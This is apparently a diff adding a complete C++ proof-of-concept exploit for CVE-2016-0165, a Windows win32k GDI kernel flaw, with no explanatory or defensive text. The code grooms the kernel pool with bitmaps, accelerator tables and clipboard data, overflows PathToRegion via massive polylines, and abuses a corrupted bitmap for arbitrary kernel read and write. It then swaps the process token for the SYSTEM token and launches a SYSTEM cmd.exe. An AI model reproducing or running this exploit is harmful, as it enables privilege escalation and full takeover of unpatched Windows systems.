@@ -1,0 +1,663 @@
+#include <Windows.h>
+#include <wingdi.h>
+#include <iostream>
+#include <Psapi.h>
+#pragma comment(lib, "psapi.lib")
+
+#define POCDEBUG 0
+
+#if POCDEBUG == 1
+#define POCDEBUG_BREAK() getchar()
+#elif POCDEBUG == 2
+#define POCDEBUG_BREAK() DebugBreak()
+#else
+#define POCDEBUG_BREAK()
+#endif
+
+static HBITMAP hBmpHunted = NULL;
+static HBITMAP hBmpExtend = NULL;
+static DWORD   iMemHunted = NULL;
+static PDWORD  pBmpHunted = NULL;
+CONST LONG maxCount = 0x6666667;
+CONST LONG maxLimit = 0x04E2000;
+CONST LONG maxTimes = 4000;
+CONST LONG tmpTimes = 5500;
+static POINT   point[maxCount] = { 0, 0 };
+static HBITMAP hbitmap[maxTimes] = { NULL };
+static HACCEL  hacctab[tmpTimes] = { NULL };
+CONST LONG iExtHeight = 948;
+CONST LONG iExtpScan0 = 951;
+
+static
+VOID
+xxCreateClipboard(DWORD Size)
+{
+    PBYTE Buffer = (PBYTE)malloc(Size);
+    FillMemory(Buffer, Size, 0x41);
+    Buffer[Size - 1] = 0x00;
+    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, (SIZE_T)Size);
+    CopyMemory(GlobalLock(hMem), Buffer, (SIZE_T)Size);
+    GlobalUnlock(hMem);
+    SetClipboardData(CF_TEXT, hMem);
+}
+
+static
+BOOL xxPoint(LONG id, DWORD Value)
+{
+    LONG iLeng = 0x00;
+    pBmpHunted[id] = Value;
+    iLeng = SetBitmapBits(hBmpHunted, 0x1000, pBmpHunted);
+    if (iLeng < 0x1000)
+    {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+BOOL xxPointToHit(LONG addr, PVOID pvBits, DWORD cb)
+{
+    LONG iLeng = 0;
+    pBmpHunted[iExtpScan0] = addr;
+    iLeng = SetBitmapBits(hBmpHunted, 0x1000, pBmpHunted);
+    if (iLeng < 0x1000)
+    {
+        return FALSE;
+    }
+    iLeng = SetBitmapBits(hBmpExtend, cb, pvBits);
+    if (iLeng < (LONG)cb)
+    {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+BOOL xxPointToGet(LONG addr, PVOID pvBits, DWORD cb)
+{
+    LONG iLeng = 0;
+    pBmpHunted[iExtpScan0] = addr;
+    iLeng = SetBitmapBits(hBmpHunted, 0x1000, pBmpHunted);
+    if (iLeng < 0x1000)
+    {
+        return FALSE;
+    }
+    iLeng = GetBitmapBits(hBmpExtend, cb, pvBits);
+    if (iLeng < (LONG)cb)
+    {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+VOID xxInitPoints(VOID)
+{
+    for (LONG i = 0; i < maxCount; i++)
+    {
+        point[i].x = (i % 2) + 1;
+        point[i].y = 100;
+    }
+    for (LONG i = 0; i < 75; i++)
+    {
+        point[i].y = i + 1;
+    }
+}
+
+static
+BOOL xxDrawPolyLines(HDC hdc)
+{
+    for (LONG i = maxCount; i > 0; i -= min(maxLimit, i))
+    {
+        // std::cout << ":" << (PVOID)i << std::endl;
+        if (!PolylineTo(hdc, &point[maxCount - i], min(maxLimit, i)))
+        {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+static
+BOOL xxCreateBitmaps(INT nWidth, INT Height, UINT nbitCount)
+{
+    POCDEBUG_BREAK();
+    for (LONG i = 0; i < maxTimes; i++)
+    {
+        hbitmap[i] = CreateBitmap(nWidth, Height, 1, nbitCount, NULL);
+        if (hbitmap[i] == NULL)
+        {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+static
+BOOL xxCreateAcceleratorTables(VOID)
+{
+    POCDEBUG_BREAK();
+    for (LONG i = 0; i < tmpTimes; i++)
+    {
+        ACCEL acckey[0x0D] = { 0 };
+        hacctab[i] = CreateAcceleratorTableA(acckey, 0x0D);
+        if (hacctab[i] == NULL)
+        {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+static
+BOOL xxDeleteBitmaps(VOID)
+{
+    BOOL bReturn = FALSE;
+    POCDEBUG_BREAK();
+    for (LONG i = 0; i < maxTimes; i++)
+    {
+        bReturn = DeleteObject(hbitmap[i]);
+        hbitmap[i] = NULL;
+    }
+    return bReturn;
+}
+
+static
+VOID xxCreateClipboards(VOID)
+{
+    POCDEBUG_BREAK();
+    for (LONG i = 0; i < maxTimes; i++)
+    {
+        xxCreateClipboard(0xB5C);
+    }
+}
+
+static
+BOOL xxDigHoleInAcceleratorTables(LONG b, LONG e)
+{
+    BOOL bReturn = FALSE;
+    for (LONG i = b; i < e; i++)
+    {
+        bReturn = DestroyAcceleratorTable(hacctab[i]);
+        hacctab[i] = NULL;
+    }
+    return bReturn;
+}
+
+static
+VOID xxDeleteAcceleratorTables(VOID)
+{
+    for (LONG i = 0; i < tmpTimes; i++)
+    {
+        if (hacctab[i] == NULL)
+        {
+            continue;
+        }
+        DestroyAcceleratorTable(hacctab[i]);
+        hacctab[i] = NULL;
+    }
+}
+
+static
+BOOL xxRetrieveBitmapBits(VOID)
+{
+    pBmpHunted = static_cast<PDWORD>(malloc(0x1000));
+    ZeroMemory(pBmpHunted, 0x1000);
+    LONG index = -1;
+    LONG iLeng = -1;
+    POCDEBUG_BREAK();
+    for (LONG i = 0; i < maxTimes; i++)
+    {
+        iLeng = GetBitmapBits(hbitmap[i], 0x1000, pBmpHunted);
+        if (iLeng < 0x2D0)
+        {
+            continue;
+        }
+        index = i;
+        std::cout << "LOCATE: " << '[' << i << ']' << hbitmap[i] << std::endl;
+        hBmpHunted = hbitmap[i];
+        break;
+    }
+    if (index == -1)
+    {
+        std::cout << "FAILED: " << (PVOID)(-1) << std::endl;
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+BOOL xxGetExtendPalette(VOID)
+{
+    PVOID pBmpExtend = malloc(0x1000);
+    LONG index = -1;
+    POCDEBUG_BREAK();
+    for (LONG i = 0; i < maxTimes; i++)
+    {
+        if (hbitmap[i] == hBmpHunted)
+        {
+            continue;
+        }
+        if (GetBitmapBits(hbitmap[i], 0x1000, pBmpExtend) < 0x2D0)
+        {
+            continue;
+        }
+        index = i;
+        std::cout << "LOCATE: " << '[' << i << ']' << hbitmap[i] << std::endl;
+        hBmpExtend = hbitmap[i];
+        break;
+    }
+    free(pBmpExtend);
+    pBmpExtend = NULL;
+    if (index == -1)
+    {
+        std::cout << "FAILED: " << (PVOID)(-1) << std::endl;
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+VOID xxOutputBitmapBits(VOID)
+{
+    POCDEBUG_BREAK();
+    for (LONG i = 0; i < 0x1000 / sizeof(DWORD); i++)
+    {
+        std::cout << '[';
+        std::cout.fill('0');
+        std::cout.width(4);
+        std::cout << i << ']' << (PVOID)pBmpHunted[i];
+        if (((i + 1) % 4) != 0)
+        {
+            std::cout << " ";
+        }
+        else
+        {
+            std::cout << std::endl;
+        }
+    }
+    std::cout.width(0);
+}
+
+static
+BOOL xxFixHuntedPoolHeader(VOID)
+{
+    DWORD szInputBit[0x100] = { 0 };
+    CONST LONG iTrueCbdHead = 205;
+    CONST LONG iTrueBmpHead = 937;
+    szInputBit[0] = pBmpHunted[iTrueCbdHead + 0];
+    szInputBit[1] = pBmpHunted[iTrueCbdHead + 1];
+    BOOL bReturn = FALSE;
+    bReturn = xxPointToHit(iMemHunted + 0x000, szInputBit, 0x08);
+    if (!bReturn)
+    {
+        return FALSE;
+    }
+    szInputBit[0] = pBmpHunted[iTrueBmpHead + 0];
+    szInputBit[1] = pBmpHunted[iTrueBmpHead + 1];
+    bReturn = xxPointToHit(iMemHunted + 0xb70, szInputBit, 0x08);
+    if (!bReturn)
+    {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+BOOL xxFixHuntedBitmapObject(VOID)
+{
+    DWORD szInputBit[0x100] = { 0 };
+    szInputBit[0] = (DWORD)hBmpHunted;
+    BOOL bReturn = FALSE;
+    bReturn = xxPointToHit(iMemHunted + 0xb78, szInputBit, 0x04);
+    if (!bReturn)
+    {
+        return FALSE;
+    }
+    bReturn = xxPointToHit(iMemHunted + 0xb8c, szInputBit, 0x04);
+    if (!bReturn)
+    {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+DWORD_PTR
+xxGetNtoskrnlAddress(VOID)
+{
+    DWORD_PTR AddrList[500] = { 0 };
+    DWORD cbNeeded = 0;
+    EnumDeviceDrivers((LPVOID *)&AddrList, sizeof(AddrList), &cbNeeded);
+    return AddrList[0];
+}
+
+static
+DWORD_PTR
+xxGetSysPROCESS(VOID)
+{
+    DWORD_PTR Module = 0x00;
+    DWORD_PTR NtAddr = 0x00;
+    Module = (DWORD_PTR)LoadLibraryA("ntkrnlpa.exe");
+    NtAddr = (DWORD_PTR)GetProcAddress((HMODULE)Module, "PsInitialSystemProcess");
+    FreeLibrary((HMODULE)Module);
+    NtAddr = NtAddr - Module;
+    Module = xxGetNtoskrnlAddress();
+    if (Module == 0x00)
+    {
+        return 0x00;
+    }
+    NtAddr = NtAddr + Module;
+    if (!xxPointToGet(NtAddr, &NtAddr, sizeof(DWORD_PTR)))
+    {
+        return 0x00;
+    }
+    return NtAddr;
+}
+
+CONST LONG off_EPROCESS_UniqueProId = 0x0b4;
+CONST LONG off_EPROCESS_ActiveLinks = 0x0b8;
+
+static
+DWORD_PTR
+xxGetTarPROCESS(DWORD_PTR SysPROC)
+{
+    if (SysPROC == 0x00)
+    {
+        return 0x00;
+    }
+    DWORD_PTR point = SysPROC;
+    DWORD_PTR value = 0x00;
+    do
+    {
+        value = 0x00;
+        xxPointToGet(point + off_EPROCESS_UniqueProId, &value, sizeof(DWORD_PTR));
+        if (value == 0x00)
+        {
+            break;
+        }
+        if (value == GetCurrentProcessId())
+        {
+            return point;
+        }
+        value = 0x00;
+        xxPointToGet(point + off_EPROCESS_ActiveLinks, &value, sizeof(DWORD_PTR));
+        if (value == 0x00)
+        {
+            break;
+        }
+        point = value - off_EPROCESS_ActiveLinks;
+        if (point == SysPROC)
+        {
+            break;
+        }
+    } while (TRUE);
+    return 0x00;
+}
+
+CONST LONG off_EPROCESS_Token = 0x0f8;
+static DWORD_PTR dstToken = 0x00;
+static DWORD_PTR srcToken = 0x00;
+
+static
+BOOL
+xxModifyTokenPointer(DWORD_PTR dstPROC, DWORD_PTR srcPROC)
+{
+    if (dstPROC == 0x00 || srcPROC == 0x00)
+    {
+        return FALSE;
+    }
+    // get target process original token pointer
+    xxPointToGet(dstPROC + off_EPROCESS_Token, &dstToken, sizeof(DWORD_PTR));
+    if (dstToken == 0x00)
+    {
+        return FALSE;
+    }
+    // get system process token pointer
+    xxPointToGet(srcPROC + off_EPROCESS_Token, &srcToken, sizeof(DWORD_PTR));
+    if (srcToken == 0x00)
+    {
+        return FALSE;
+    }
+    // modify target process token pointer to system
+    xxPointToHit(dstPROC + off_EPROCESS_Token, &srcToken, sizeof(DWORD_PTR));
+    // just test if the modification is successful
+    DWORD_PTR tmpToken = 0x00;
+    xxPointToGet(dstPROC + off_EPROCESS_Token, &tmpToken, sizeof(DWORD_PTR));
+    if (tmpToken != srcToken)
+    {
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static
+BOOL
+xxRecoverTokenPointer(DWORD_PTR dstPROC, DWORD_PTR srcPROC)
+{
+    if (dstPROC == 0x00 || srcPROC == 0x00)
+    {
+        return FALSE;
+    }
+    if (dstToken == 0x00 || srcToken == 0x00)
+    {
+        return FALSE;
+    }
+    // recover the original token pointer to target process
+    xxPointToHit(dstPROC + off_EPROCESS_Token, &dstToken, sizeof(DWORD_PTR));
+    return TRUE;
+}
+
+static
+VOID xxCreateCmdLineProcess(VOID)
+{
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOW;
+    WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
+    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
+}
+
+static
+VOID xxPrivilegeElevation(VOID)
+{
+    BOOL bReturn = FALSE;
+    do
+    {
+        DWORD SysPROC = 0x0;
+        DWORD TarPROC = 0x0;
+        POCDEBUG_BREAK();
+        SysPROC = xxGetSysPROCESS();
+        if (SysPROC == 0x00)
+        {
+            break;
+        }
+        std::cout << "SYSTEM PROCESS: " << (PVOID)SysPROC << std::endl;
+        POCDEBUG_BREAK();
+        TarPROC = xxGetTarPROCESS(SysPROC);
+        if (TarPROC == 0x00)
+        {
+            break;
+        }
+        std::cout << "TARGET PROCESS: " << (PVOID)TarPROC << std::endl;
+        POCDEBUG_BREAK();
+        bReturn = xxModifyTokenPointer(TarPROC, SysPROC);
+        if (!bReturn)
+        {
+            break;
+        }
+        std::cout << "MODIFIED TOKEN TO SYSTEM!" << std::endl;
+        std::cout << "CREATE NEW CMDLINE PROCESS..." << std::endl;
+        POCDEBUG_BREAK();
+        xxCreateCmdLineProcess();
+        POCDEBUG_BREAK();
+        std::cout << "RECOVER TOKEN..." << std::endl;
+        bReturn = xxRecoverTokenPointer(TarPROC, SysPROC);
+        if (!bReturn)
+        {
+            break;
+        }
+        bReturn = TRUE;
+    } while (FALSE);
+    if (!bReturn)
+    {
+        std::cout << "FAILED" << std::endl;
+    }
+}
+
+INT POC_CVE20160165(VOID)
+{
+    std::cout << "-------------------" << std::endl;
+    std::cout << "POC - CVE-2016-0165" << std::endl;
+    std::cout << "-------------------" << std::endl;
+
+    BOOL bReturn = FALSE;
+
+    do
+    {
+        std::cout << "INIT POINTS..." << std::endl;
+        xxInitPoints();
+
+        HDC hdc = GetDC(NULL);
+        std::cout << "GET DEVICE CONTEXT: " << hdc << std::endl;
+        if (hdc == NULL)
+        {
+            bReturn = FALSE;
+            break;
+        }
+
+        std::cout << "BEGIN DC PATH..." << std::endl;
+        bReturn = BeginPath(hdc);
+        if (!bReturn)
+        {
+            break;
+        }
+
+        std::cout << "DRAW POLYLINES..." << std::endl;
+        bReturn = xxDrawPolyLines(hdc);
+        if (!bReturn)
+        {
+            break;
+        }
+
+        std::cout << "ENDED DC PATH..." << std::endl;
+        bReturn = EndPath(hdc);
+        if (!bReturn)
+        {
+            break;
+        }
+
+        std::cout << "CREATE BITMAPS (1)..." << std::endl;
+        bReturn = xxCreateBitmaps(0xE34, 0x01, 8);
+        if (!bReturn)
+        {
+            break;
+        }
+
+        std::cout << "CREATE ACCTABS (1)..." << std::endl;
+        bReturn = xxCreateAcceleratorTables();
+        if (!bReturn)
+        {
+            break;
+        }
+
+        std::cout << "DELETE BITMAPS (1)..." << std::endl;
+        xxDeleteBitmaps();
+
+        std::cout << "CREATE CLIPBDS (1)..." << std::endl;
+        xxCreateClipboards();
+
+        std::cout << "CREATE BITMAPS (2)..." << std::endl;
+        bReturn = xxCreateBitmaps(0x01, 0xB1, 32);
+
+        std::cout << "DELETE ACCTABS (H)..." << std::endl;
+        xxDigHoleInAcceleratorTables(2000, 4000);
+
+        std::cout << "PATH TO REGION..." << std::endl;
+        POCDEBUG_BREAK();
+        HRGN hrgn = PathToRegion(hdc);
+        if (hrgn == NULL)
+        {
+            bReturn = FALSE;
+            break;
+        }
+        std::cout << "DELETE REGION..." << std::endl;
+        DeleteObject(hrgn);
+
+        std::cout << "LOCATE HUNTED BITMAP..." << std::endl;
+        bReturn = xxRetrieveBitmapBits();
+        if (!bReturn)
+        {
+            break;
+        }
+
+        // std::cout << "OUTPUT BITMAP BITS..." << std::endl;
+        // xxOutputBitmapBits();
+
+        std::cout << "MODIFY EXTEND BITMAP HEIGHT..." << std::endl;
+        POCDEBUG_BREAK();
+        bReturn = xxPoint(iExtHeight, 0xFFFFFFFF);
+        if (!bReturn)
+        {
+            break;
+        }
+
+        std::cout << "LOCATE EXTEND BITMAP..." << std::endl;
+        bReturn = xxGetExtendPalette();
+        if (!bReturn)
+        {
+            break;
+        }
+
+        if ((pBmpHunted[iExtpScan0] & 0xFFF) != 0x00000CCC)
+        {
+            bReturn = FALSE;
+            std::cout << "FAILED: " << (PVOID)pBmpHunted[iExtpScan0] << std::endl;
+            break;
+        }
+        iMemHunted = (pBmpHunted[iExtpScan0] & ~0xFFF) - 0x1000;
+        std::cout << "HUNTED PAGE: " << (PVOID)iMemHunted << std::endl;
+        std::cout << "FIX HUNTED POOL HEADER..." << std::endl;
+        bReturn = xxFixHuntedPoolHeader();
+        if (!bReturn)
+        {
+            break;
+        }
+
+        std::cout << "FIX HUNTED BITMAP OBJECT..." << std::endl;
+        bReturn = xxFixHuntedBitmapObject();
+        if (!bReturn)
+        {
+            break;
+        }
+
+        std::cout << "-------------------" << std::endl;
+        std::cout << "PRIVILEGE ELEVATION" << std::endl;
+        std::cout << "-------------------" << std::endl;
+        xxPrivilegeElevation();
+        std::cout << "-------------------" << std::endl;
+
+        std::cout << "DELETE BITMAPS (2)..." << std::endl;
+        xxDeleteBitmaps();
+
+        std::cout << "DELETE ACCTABS (3)..." << std::endl;
+        xxDeleteAcceleratorTables();
+        bReturn = TRUE;
+    } while (FALSE);
+
+    if (!bReturn)
+    {
+        std::cout << GetLastError() << std::endl;
+    }
+    std::cout << "-------------------" << std::endl;
+    getchar();
+    return 0;
+}
+
+INT main(INT argc, CHAR *argv[])
+{
+    POC_CVE20160165();
+    return 0;
+}
